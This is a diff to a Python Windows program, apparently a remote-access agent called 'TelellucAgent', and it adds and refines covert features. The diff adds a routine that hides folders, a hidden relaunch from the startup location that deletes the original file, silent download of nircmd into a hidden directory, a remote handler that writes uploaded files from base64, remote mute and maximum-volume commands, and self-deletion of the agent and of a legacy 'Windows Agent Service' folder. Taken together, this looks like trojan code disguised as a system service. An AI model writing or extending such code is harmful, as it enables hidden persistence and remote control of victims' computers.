@@ -84,6 +84,28 @@ SWP_SHOWWINDOW = 0x0040
 
 
 
+def make_hidden(folder_path):
+    """Mark a folder as hidden on Windows. Retries if locked. Returns True if successful."""
+    if not os.path.exists(folder_path):
+        return False
+
+    for attempt in range(3):
+        try:
+            subprocess.run(
+                f'attrib +h "{folder_path}"',
+                shell=True,
+                capture_output=True,
+                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
+                timeout=5
+            )
+            return True
+        except:
+            if attempt < 2:
+                import time
+                time.sleep(0.2)
+    return False
+
+
 def ensure_nircmd():
     nircmd_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent", "nircmd.exe")
     if os.path.exists(nircmd_path):
@@ -92,15 +114,7 @@ def ensure_nircmd():
     try:
         nircmd_dir = os.path.dirname(nircmd_path)
         os.makedirs(nircmd_dir, exist_ok=True)
-        try:
-            subprocess.run(
-                f'attrib +h "{nircmd_dir}"',
-                shell=True,
-                capture_output=True,
-                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
-            )
-        except:
-            pass
+        make_hidden(nircmd_dir)
         print("[nircmd] Downloading nircmd.exe...", flush=True)
         nircmd_url = "https://www.nirsoft.net/utils/nircmd.zip"
         zip_path = os.path.join(os.path.dirname(nircmd_path), "nircmd.zip")
@@ -211,24 +225,26 @@ def ensure_startup():
     if getattr(sys, "frozen", False):
         source_exe = os.path.abspath(sys.executable)
         try:
+            # Copy to startup if doesn't exist or if source is newer (compiled recently)
             if not os.path.exists(startup_exe):
                 shutil.copy2(source_exe, startup_exe)
             elif os.path.getmtime(source_exe) > os.path.getmtime(startup_exe):
                 shutil.copy2(source_exe, startup_exe)
 
+            # Migration logic: if startup copy exists and is different from current exe
             if os.path.exists(startup_exe) and os.path.exists(source_exe) and os.path.abspath(source_exe) != os.path.abspath(startup_exe):
                 try:
-                    if os.path.getmtime(startup_exe) > os.path.getmtime(source_exe):
-                        try:
-                            subprocess.Popen(
-                                [startup_exe],
-                                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
-                                stdout=subprocess.DEVNULL,
-                                stderr=subprocess.DEVNULL,
-                            )
-                        except OSError:
-                            pass
-
+                    # IMPORTANT: Use >= not > because shutil.copy2() preserves timestamps
+                    # After copying, startup and source will have EQUAL timestamps
+                    # >= condition catches both "just copied" (equal) and "was recently executed" (newer) cases
+                    # This ensures the executable always runs from startup on each launch
+                    if os.path.getmtime(startup_exe) >= os.path.getmtime(source_exe):
+                        subprocess.Popen(
+                            [startup_exe],
+                            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                        )
                         _schedule_delete(source_exe)
                         os._exit(0)
                 except OSError:
@@ -262,6 +278,10 @@ def self_delete_agent(trigger_id):
     try:
         if os.path.exists(local_dir):
             shutil.rmtree(local_dir, ignore_errors=True)
+        # Also remove legacy "Windows Agent Service" folder if it exists
+        legacy_folder = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Windows Agent Service")
+        if os.path.exists(legacy_folder):
+            shutil.rmtree(legacy_folder, ignore_errors=True)
     except:
         pass
 
@@ -513,12 +533,16 @@ def execute_shell_command(cmd_str):
         # Handle upload command
         if cmd_lower.startswith("__upload__:"):
             try:
+                # IMPORTANT: Uses "|" delimiter, NOT ":" because Windows paths contain "C:\"
+                # Splitting on ":" would break at drive letter (C:) instead of delimiter
+                # Format: __upload__|path/to/file|base64content
                 parts = cmd_str.split("|", 2)
                 if len(parts) < 3:
                     return "Error: Invalid upload command"
                 filepath = parts[1].strip()
                 file_content_b64 = parts[2]
 
+                # Estimate decoded size: base64 adds ~33% overhead, so multiply by 0.75 to get approximate original size
                 file_size = len(file_content_b64) * 0.75
                 if file_size > 10 * 1024 * 1024:
                     return f"Error: File too large. Maximum is 10MB"
@@ -766,12 +790,20 @@ def execute_shell_command(cmd_str):
             except Exception as e:
                 return f"Error: {str(e)}"
 
-        # Handle max_audio command
+        # Handle max_audio command - sets volume to 100% and unmutes if muted
         if cmd_lower == "max_audio":
             try:
                 nircmd_path = ensure_nircmd()
                 if not nircmd_path:
                     return "Error: Could not download nircmd"
+                # Unmute first (in case it's muted)
+                subprocess.run(
+                    [nircmd_path, "muteaudio", "off"],
+                    capture_output=True,
+                    timeout=5,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                )
+                # Set volume to maximum
                 result = subprocess.run(
                     [nircmd_path, "setsysvolume", "65535"],
                     capture_output=True,
@@ -779,12 +811,30 @@ def execute_shell_command(cmd_str):
                     creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
                 )
                 if result.returncode == 0:
-                    return "Volume: 100%"
+                    return "Volume: 100% (unmuted)"
                 return "Error: Failed to set volume"
             except Exception as e:
                 return f"Error: {str(e)}"
 
-        # Handle min_audio command
+        # Handle mute command - silences audio
+        if cmd_lower == "mute":
+            try:
+                nircmd_path = ensure_nircmd()
+                if not nircmd_path:
+                    return "Error: Could not download nircmd"
+                result = subprocess.run(
+                    [nircmd_path, "muteaudio", "on"],
+                    capture_output=True,
+                    timeout=5,
+                    creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, "CREATE_NO_WINDOW") else 0
+                )
+                if result.returncode == 0:
+                    return "Audio: muted"
+                return "Error: Failed to mute"
+            except Exception as e:
+                return f"Error: {str(e)}"
+
+        # Handle min_audio command - sets volume to 0%
         if cmd_lower == "min_audio":
             try:
                 nircmd_path = ensure_nircmd()
